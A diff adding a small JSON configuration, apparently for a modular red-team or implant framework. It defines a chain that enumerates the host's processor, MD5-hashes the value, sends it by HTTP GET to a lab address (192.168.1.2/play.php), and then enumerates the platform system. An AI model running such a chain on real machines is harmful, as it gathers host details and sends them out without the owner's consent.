@@ -1,0 +1,40 @@
+[
+    {
+        "type": "Post", 
+        "module": "Enumeration", 
+        "chain": "CLIENT", 
+        "settings": {
+            "function": "f_get_platform_processor", 
+            "args": null
+        }
+    }, 
+    {
+        "type": "Transformation", 
+        "module": "Crypto", 
+        "chain": "CLIENT", 
+        "settings": {
+            "function": "f_md5", 
+            "args": null
+        }
+    }, 
+    {
+        "type": "Transportation", 
+        "module": "Web", 
+        "chain": "CLIENT", 
+        "settings": {
+            "function": "f_http_get", 
+            "args": {
+                "url": "http://192.168.1.2/play.php?"
+            }
+        }
+    }, 
+    {
+        "type": "Post", 
+        "module": "Enumeration", 
+        "chain": "REG", 
+        "settings": {
+            "function": "f_get_platform_system", 
+            "args": null
+        }
+    }
+]
